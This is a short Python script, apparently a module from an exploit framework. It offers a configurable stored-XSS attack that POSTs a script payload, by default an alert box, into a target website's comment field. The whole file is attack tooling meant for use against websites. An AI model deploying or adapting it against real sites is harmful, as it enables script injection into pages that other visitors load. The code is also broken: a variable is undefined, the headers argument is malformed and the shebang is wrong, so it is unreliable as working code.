#!usr/bin/python

import requests
from colorama import Fore, Style

class Exploit:
	config = {
        "URI": "https://www.example.com",
        "Script": """<script>alert("Xss")</script>""",
        "CommentField": "",
        "useragent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    	}

	def show_options(self):
		print(Fore.YELLOW+"Options"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(key, self.config[key], self.get_config(key)+Style.RESET_ALL)
	def run(self):
		Script=self.config["Script"]

		DataPost={CommentField:Script}

		HackingSession=requests.session()

		try:

			HackingSession.post(self.config["URI"], data=DataPost, headers=self.config["useragent"])

		except:
			print(Fore.RED+"[-]"+Style.RESET_ALL+" Cant't Send Payload")
			exit()

	@staticmethod
	def show_info():
		print(Fore.YELLOW+"\nThis exploit is for websites\nthat are vulnerable to xss"+Style.RESET_ALL)

	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key] = value
		else:
			print("No options")

	def get_config(self, key):
		return self.config[key]
